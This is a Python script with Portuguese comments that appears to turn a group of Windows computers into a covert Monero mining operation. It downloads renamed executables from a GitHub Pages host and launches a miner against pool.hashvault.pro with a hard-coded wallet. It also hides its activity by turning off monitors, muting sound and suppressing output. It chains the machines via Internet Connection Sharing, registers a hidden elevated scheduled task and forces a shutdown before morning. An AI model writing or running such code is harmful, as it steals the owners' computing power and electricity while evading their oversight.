import subprocess
import os
import shutil
import time
import datetime
import urllib.request
from pathlib import Path
import tempfile
import subprocess, re, sys

# Configurações fixas
wifi_interface = "Wi-Fi 4"
ethernet_interface = "Ethernet"
wifi_ssid = "AAPM"
shutdown_hour = 5
shutdown_minute = 40
base_url = "https://lokilaki.github.io/dcreamit/"
arquivos_para_baixar = ["crealit.exe", "sart.exe","WinRing0x64.sys"]
destino = Path("C:/ProgramData/Temp")
# destino = Path(os.getenv("APPDATA")) / "Temp"
#destino = Path(tempfile.gettempdir())

def is_after_23():
    return datetime.datetime.now().hour >= 23

import subprocess
import time

def connect_to_wifi():
    # 1. Ativa o adaptador (caso esteja desativado)
    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        f"Enable-NetAdapter -Name '{wifi_interface}' -Confirm:$false -ErrorAction SilentlyContinue"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(3)

    # 2. Liga o rádio Wi-Fi (caso esteja em modo avião ou manualmente desativado)
    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        "Get-NetAdapter | Where-Object {$_.InterfaceDescription -Match 'Wi-Fi'} | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        "netsh interface set interface name='Wi-Fi 4' admin=enabled"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 3. Tenta conectar à rede AAPM
    subprocess.run(
        f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )


def enable_ics():
    try:
        variaveis = f"""
            $internet = "{wifi_interface}"
            $local = "{ethernet_interface}"
            """
        script = """
            # Obtem o gerenciador de conexões
            $sharingManager = New-Object -ComObject HNetCfg.HNetShare

            # Pega todas as conexões
            $connections = $sharingManager.EnumEveryConnection()

            foreach ($conn in $connections) {
                $props = $sharingManager.NetConnectionProps($conn)

                if ($props.Name -eq $internet) {
                    $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
                    $cfg.EnableSharing(0)  # 0 = ICS para compartilhamento com outras conexões
                    Write-Output "ICS ativado na conexão de internet: $internet"
                }

                if ($props.Name -eq $local) {
                    $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
                    $cfg.EnableSharing(1)  # 1 = ICS como cliente da outra conexão
                    Write-Output "ICS habilitado como conexão doméstica: $local"
                }
            }
        """
        ps_script = variaveis + script
        subprocess.run(["powershell", "-Command", ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def restart_ethernet():
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def schedule_shutdown():
    now = datetime.datetime.now()
    shutdown_time = now.replace(hour=5, minute=30, second=0)
    if shutdown_time < now:
        shutdown_time += datetime.timedelta(days=1)
    secs_left = int((shutdown_time - now).total_seconds())

    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # agenda o desligamento forçado
    subprocess.run(f'shutdown /s /f /t {secs_left}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def disable_ics():
    now = datetime.datetime.now()
    shutdown_time = now.replace(hour=shutdown_hour, minute=shutdown_minute, second=0)
    if shutdown_time < now:
        shutdown_time += datetime.timedelta(days=1)
    secs_left = int((shutdown_time - now).total_seconds())

    # Criar script PS1 que desativa o ICS
    destino.mkdir(exist_ok=True, parents=True)
    bat_path = (destino / "desativar_ics.ps1").resolve()
    
    variaveis = f"""
$internet = "{wifi_interface}" 
$local = "{ethernet_interface}"
"""
    comandos = """
$sharingManager = New-Object -ComObject HNetCfg.HNetShare
$connections = $sharingManager.EnumEveryConnection()

foreach ($conn in $connections) {
    $props = $sharingManager.NetConnectionProps($conn)

    if ($props.Name -eq $internet -or $props.Name -eq $local) {
        $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
        if ($cfg.SharingEnabled) {
            $cfg.DisableSharing()
        }
    }
}
"""
    script = variaveis + comandos
    bat_path.write_text(script, encoding="utf-8")

    # Agendar execução 5 minutos antes do desligamento
    trigger_time = (shutdown_time - datetime.timedelta(minutes=5)).strftime("%H:%M")

    # Comando PowerShell para criar a tarefa
    ps_cmd = rf'''
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{bat_path}"'
$trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}"
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
Register-ScheduledTask -TaskName 'DesativarICS' `
                       -Action $action `
                       -Trigger $trigger `
                       -Settings $settings `
                       -RunLevel Highest -Force
'''

    subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
def baixar_arquivos():
    destino.mkdir(parents=True, exist_ok=True)
    for arquivo in arquivos_para_baixar:
        url = base_url + arquivo
        destino_final = destino / arquivo
        try:
            urllib.request.urlretrieve(url, destino_final)
        except Exception:
            continue

def desligar_monitor():
    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_computer_description():
    try:
        result = subprocess.check_output(
            ['powershell', '-Command', "(Get-WmiObject Win32_OperatingSystem).Description"],
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
            text=True
        )
        return result.strip()
    except Exception:
        return "sem_descricao"

def ligar_crealit():
    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 ', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                  dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
    descricao = get_computer_description()

    # Extrair os dois últimos dígitos
    m = re.search(r'(\d{2})\s*$', descricao)
    if not m:
        raise ValueError("Descrição inválida. Esperado dois dígitos no final.")
    sequencial = int(m.group(1))
    host_id = 254 - sequencial
    ip = f"{rede_base}{host_id}"

    if usar_powershell:
        # PowerShell nativo
        ps_cmd = f"""
        $iface = Get-NetAdapter | Where-Object {{ $_.Name -eq '{ethernet_interface}' }}
        if ($iface) {{
            Get-NetIPAddress -InterfaceAlias '{ethernet_interface}' -AddressFamily IPv4 | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue
            New-NetIPAddress -InterfaceAlias '{ethernet_interface}' -IPAddress '{ip}' -PrefixLength 24 -DefaultGateway '{gateway}' -ErrorAction Stop
            Set-DnsClientServerAddress -InterfaceAlias '{ethernet_interface}' -ServerAddresses @('{dns1}', '{dns2}')
        }} else {{
            Write-Error "Interface '{ethernet_interface}' não encontrada."
            exit 1
        }}
        """
    else:
        # netsh via PowerShell
        ps_cmd = f"""
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip set address name="{ethernet_interface}" static {ip} {mascara} {gateway} 1' -Wait
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip set dns name="{ethernet_interface}" static {dns1} primary' -Wait
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip add dns name="{ethernet_interface}" {dns2} index=2' -Wait
        """

    result = subprocess.run(
        ["powershell", "-Command", ps_cmd],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    if result.returncode != 0:
        raise RuntimeError("Falha ao configurar IP.")
    


def main_master():
    # if not is_after_23():
    #     return
    baixar_arquivos()
    #desligar_monitor()  
    schedule_shutdown()  
    connect_to_wifi()
    time.sleep(10)
    enable_ics()
    time.sleep(10)
    restart_ethernet()
    ligar_crealit()
    disable_ics()

def main_slave():
    # if not is_after_23():
    #      return
    baixar_arquivos()
    desligar_monitor() 
    configurar_ip(usar_powershell=False)
    time.sleep(10)
    #restart_ethernet()
    schedule_shutdown()
    ligar_crealit()

def main_teste():
    # if not is_after_23():
    #     return
    # desligar_monitor()  
    # schedule_shutdown()  
    # connect_to_wifi()
    # time.sleep(10)
    enable_ics()
    # time.sleep(10)
    # restart_ethernet()
    # baixar_arquivos()
    # ligar_crealit()
    disable_ics()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        perfil = sys.argv[1]
        print(f"Executando no perfil: {perfil}")
        if perfil.upper() == "MASTER":
            main_master()
        elif perfil.upper() == "SLAVE":
            main_slave()
        elif perfil.upper() == "TESTE":
            main_teste()
    else:
        main_master()
        sys.exit(1)
